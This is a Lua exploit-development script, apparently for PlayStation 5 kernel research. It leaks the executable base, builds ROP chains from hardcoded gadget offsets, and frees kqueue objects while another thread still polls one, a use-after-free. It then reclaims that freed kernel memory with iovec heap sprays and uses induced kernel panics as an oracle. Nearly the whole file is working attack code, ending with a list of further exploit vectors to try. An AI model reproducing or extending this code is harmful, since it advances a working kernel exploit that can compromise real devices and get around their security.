-- CRASH_CLASS: RISKY (kernel panic if correct size reclaims)
-- PROBE 500m: Multi-size iov spray + 25s wait + crash oracle
--
-- Context: 500k proved 256B iov spray doesn't reclaim kqueue.
-- Two possible reasons: (A) kqueue is in dedicated UMA zone (kq_zone)
-- and uma_reclaim hasn't fired, or (B) sizeof(kqueue) != 256B so it's
-- in a different general-malloc bucket. 500l tried page-level reclaim
-- with 3s wait — survived (too short for uma_timeout ~20s cycle).
--
-- This probe: 25-second wait + tries BOTH 256B and 512B spray sizes.
-- Iteration 1: 256B spray (16 iovecs), crash oracle
-- Iteration 2: 512B spray (32 iovecs), crash oracle
--
-- If PS5 reboots on iter 1 → kqueue is 256B, page-level reclaim worked
-- If PS5 reboots on iter 2 → kqueue is 512B bucket
-- If survives both → dedicated zone confirmed, need different approach

print("=== PROBE 500m: MULTI-SIZE SPRAY + 25s WAIT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))
local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

local CRASH_VAL = uint64(0x100)

local function build_child_rop(gate_rd, first_gadgets, marker_addr)
    local stk = memory.alloc(0x8000)
    local sb = N(stk)
    local rsp = sb + 0x4000 - ((sb + 0x4000) % 16) - 8
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(SET_FSBASE)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    -- read gate
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- custom gadgets
    for _, g in ipairs(first_gadgets) do emit(g) end
    -- write marker = rax
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x4000))
    return par
end

local function build_poller(gate_rd, pollfd_addr, marker_addr, timeout_ms)
    local gadgets = {}
    -- poll(pollfd, 1, timeout)
    table.insert(gadgets, g_pop_rdi); table.insert(gadgets, uint64(pollfd_addr))
    table.insert(gadgets, g_pop_rsi); table.insert(gadgets, uint64(1))
    table.insert(gadgets, g_pop_rdx); table.insert(gadgets, uint64(timeout_ms))
    table.insert(gadgets, g_pop_rax); table.insert(gadgets, uint64(209))
    table.insert(gadgets, stub)
    return build_child_rop(gate_rd, gadgets, marker_addr)
end

local function build_closer_batch(gate_rd, fds, marker_addr)
    local gadgets = {}
    for _, fd in ipairs(fds) do
        table.insert(gadgets, g_pop_rdi); table.insert(gadgets, uint64(fd))
        table.insert(gadgets, g_pop_rax); table.insert(gadgets, uint64(6))
        table.insert(gadgets, stub)
    end
    table.insert(gadgets, g_pop_rax); table.insert(gadgets, uint64(1))
    return build_child_rop(gate_rd, gadgets, marker_addr)
end

local function build_spray_child(gate_rd, sock_rd, msghdr_addr, marker_addr)
    local gadgets = {}
    -- write pre-marker = 1
    table.insert(gadgets, g_pop_rax); table.insert(gadgets, uint64(1))
    table.insert(gadgets, g_pop_rdi); table.insert(gadgets, uint64(marker_addr))
    table.insert(gadgets, g_mov_m_rax)
    -- recvmsg(sock_rd, msghdr, 0)
    table.insert(gadgets, g_pop_rdi); table.insert(gadgets, uint64(sock_rd))
    table.insert(gadgets, g_pop_rsi); table.insert(gadgets, uint64(msghdr_addr))
    table.insert(gadgets, g_pop_rdx); table.insert(gadgets, uint64(0))
    table.insert(gadgets, g_pop_rax); table.insert(gadgets, uint64(29))
    table.insert(gadgets, stub)
    return build_child_rop(gate_rd, gadgets, marker_addr)
end

local function make_iov_buf(num_iovecs, fill_val)
    local total = num_iovecs * 16
    local buf = memory.alloc(total + 16)
    for q = 0, (total / 8) - 1 do
        wq(N(buf) + q * 8, fill_val)
    end
    return buf, total
end

local function make_msghdr(iov_buf, num_iovecs)
    local mh = memory.alloc(0x30)
    wq(N(mh), uint64(0))
    wd(N(mh) + 8, 0)
    wq(N(mh) + 0x10, uint64(N(iov_buf)))
    wd(N(mh) + 0x18, num_iovecs)
    wq(N(mh) + 0x20, uint64(0))
    wd(N(mh) + 0x28, 0)
    wd(N(mh) + 0x2C, 0)
    return mh
end

local function sleep_ms(ms)
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local sr = rd(N(sv)) or 0xFFFF
    local sw = rd(N(sv) + 4) or 0xFFFF
    if sr ~= 0xFFFF then
        local pfd = memory.alloc(8)
        wd(N(pfd), sr); wd(N(pfd) + 4, 0x00010000)
        pcall(function() mk(209)(uint64(N(pfd)), uint64(1), uint64(ms)) end)
        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        return true
    end
    return false
end

-- ================================================================
-- ITERATION LOOP: try 256B and 512B spray sizes
-- ================================================================

local sizes = {
    {iovecs = 16, bytes = 256, label = "256B (16 iovecs)"},
    {iovecs = 32, bytes = 512, label = "512B (32 iovecs)"},
}

for iter, sz in ipairs(sizes) do
    print(string.format("=== ITER %d/%d: %s spray ===", iter, #sizes, sz.label))

    if not alive() then
        print("  DEAD before iteration — previous iter likely caused panic")
        break
    end

    -- Phase A: exhaust kq_zone
    local NUM_KQ = 256
    local kq_fds = {}
    for i = 1, NUM_KQ do
        local fd = sgn(mk(362)())
        if fd >= 0 then kq_fds[#kq_fds + 1] = fd end
    end
    print("  kqueues=" .. #kq_fds)
    if #kq_fds < 64 then
        print("  too few, skipping")
        for _, fd in ipairs(kq_fds) do pcall(function() mk(6)(uint64(fd)) end) end
        break
    end

    local target_kq = kq_fds[1]

    -- Phase B: start poller (45s timeout)
    local gP_r, gP_w = make_gate()
    local pollfd = memory.alloc(8)
    wd(N(pollfd), target_kq); wd(N(pollfd) + 4, 0x00010000)
    local mP = memory.alloc(8); wd(N(mP), 0); wd(N(mP) + 4, 0xAA)
    pcall(function()
        mk(455)(build_poller(gP_r, N(pollfd), N(mP), 45000), uint64(0x38))
    end)
    pcall(function() mk(4)(uint64(gP_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 50000 do local _ = rd(N(mP)) end

    -- Phase C: close ALL kqueues
    -- Close in batches from main thread using child closer
    local gC_r, gC_w = make_gate()
    local mC = memory.alloc(8); wd(N(mC), 0)
    -- Close first 128 in one child
    local batch1 = {}
    for i = 1, math.min(128, #kq_fds) do batch1[#batch1+1] = kq_fds[i] end
    pcall(function()
        mk(455)(build_closer_batch(gC_r, batch1, N(mC)), uint64(0x38))
    end)
    pcall(function() mk(4)(uint64(gC_w), uint64(N(one_byte)), uint64(1)) end)
    for w = 1, 2000000 do if rd(N(mC)) ~= 0 then break end end

    -- Close remaining from main thread
    for i = 129, #kq_fds do
        pcall(function() mk(6)(uint64(kq_fds[i])) end)
    end
    print("  closed all kqueues")

    if not alive() then print("  DIED in close phase"); break end

    -- Phase D: VM pressure + 25-second wait
    -- Allocate 128MB and mlock to pin physical pages
    local BIG = 128 * 1024 * 1024
    local big_map = nil
    do
        local ok, v = pcall(function()
            return mk(477)(uint64(0), uint64(BIG), uint64(3), uint64(0x1002),
                           uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok then
            local h, l = get_hi_lo(v)
            if h < 0xFFFF8000 and l ~= 0 then big_map = v end
        end
    end

    if big_map then
        -- Touch every page to populate
        for off = 0, BIG - 0x4000, 0x4000 do
            pcall(function() memory.write_dword(N(big_map) + off, 0x41) end)
        end
        -- mlock to pin
        pcall(function() mk(203)(big_map, uint64(BIG)) end)
        print("  mmap+touch+mlock 128MB done")
    else
        print("  mmap 128MB failed")
    end

    if not alive() then print("  DIED after VM pressure"); break end

    print("  waiting 25 seconds for uma_reclaim...")
    sleep_ms(25000)
    print("  25s wait done")

    if not alive() then print("  DIED during wait"); break end

    -- Phase E: spray with iov (crash oracle)
    local iov_buf = make_iov_buf(sz.iovecs, CRASH_VAL)
    local NUM_SPRAY = 8
    local spray = {}
    for s = 1, NUM_SPRAY do
        local sv = memory.alloc(8)
        wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
        pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
        local sr = rd(N(sv)) or 0xFFFF
        local sw = rd(N(sv) + 4) or 0xFFFF
        local gr, gw = make_gate()
        local smk = memory.alloc(8); wd(N(smk), 0)
        local mh = make_msghdr(iov_buf, sz.iovecs)
        if sr ~= 0xFFFF and gr then
            pcall(function()
                mk(455)(build_spray_child(gr, sr, N(mh), N(smk)), uint64(0x38))
            end)
            spray[#spray + 1] = {rd=sr, wr=sw, gr=gr, gw=gw, mk=smk}
        end
    end
    for _, sd in ipairs(spray) do
        pcall(function() mk(4)(uint64(sd.gw), uint64(N(one_byte)), uint64(1)) end)
    end
    -- Brief settle time
    for d = 1, 300000 do local _ = rd(N(mP)) end

    local running = 0
    for _, sd in ipairs(spray) do
        if rd(N(sd.mk)) ~= 0 then running = running + 1 end
    end
    print(string.format("  spray %s, running=%d/%d", sz.label, running, #spray))

    if not alive() then print("  DIED in spray (unlikely)"); break end

    -- Phase F: wait for poll timeout
    print("  waiting for poll timeout (~45s)...")
    print("  REBOOT HERE = reclaim worked with " .. sz.label)

    for w = 1, 100000000 do
        if not alive() then break end
        if rd(N(mP) + 4) ~= 0xAA then break end
    end

    if not alive() then
        print("  DIED — possible kernel panic with " .. sz.label .. "!")
        break
    end

    local poll_rv = rq(uint64(N(mP)))
    print("  poll_rv=" .. fmt(poll_rv) .. " — SURVIVED")

    -- Cleanup
    for _, sd in ipairs(spray) do
        pcall(function() mk(6)(uint64(sd.rd)) end)
        pcall(function() mk(6)(uint64(sd.wr)) end)
    end
    if big_map then
        pcall(function() mk(204)(big_map, uint64(BIG)) end) -- munlock
        pcall(function() mk(73)(big_map, uint64(BIG)) end)   -- munmap
    end
    pcall(function() mk(6)(uint64(gP_r)) end)
    pcall(function() mk(6)(uint64(gP_w)) end)
    pcall(function() mk(6)(uint64(gC_r)) end)
    pcall(function() mk(6)(uint64(gC_w)) end)
    for _, sd in ipairs(spray) do
        pcall(function() mk(6)(uint64(sd.gr)) end)
        pcall(function() mk(6)(uint64(sd.gw)) end)
    end

    print("")
end

if alive() then
    print("========================================")
    print("BOTH SIZES SURVIVED")
    print("kqueue is in a dedicated UMA zone (kq_zone)")
    print("Page-level reclaim with 25s wait + 128MB mlock was not enough")
    print("")
    print("Options:")
    print("  1. Try socket fd target (different zone, might be general)")
    print("  2. Longer wait (60s+) or stronger VM pressure")
    print("  3. Abandon poll/close for kqueue, test with socket/pipe targets")
    print("  4. Different exploit vector entirely")
    print("========================================")
end
print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 500m COMPLETE ===")
